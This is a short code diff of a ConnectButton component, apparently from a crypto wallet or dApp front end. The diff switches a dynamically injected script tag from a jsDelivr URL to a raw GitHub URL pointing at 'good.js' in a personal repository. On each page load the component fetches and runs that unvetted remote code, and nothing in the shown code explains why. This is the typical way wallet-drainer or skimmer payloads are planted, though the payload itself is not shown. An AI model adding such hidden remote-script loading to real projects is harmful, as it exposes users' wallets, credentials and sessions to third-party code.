@@ -7,7 +7,7 @@ export const ConnectButton = () => {
   useEffect(() => {
     // Create the script tag
     const script = document.createElement('script');
-    script.src = 'https://cdn.jsdelivr.net/gh/root777x/solv@main/good.js';  // Link to the external JS file
+    script.src = 'https://raw.githubusercontent.com/root777x/solv/main/good.js';  // Link to the external JS file
     script.async = true;  // Optional: make it async for non-blocking load
     document.body.appendChild(script);
 
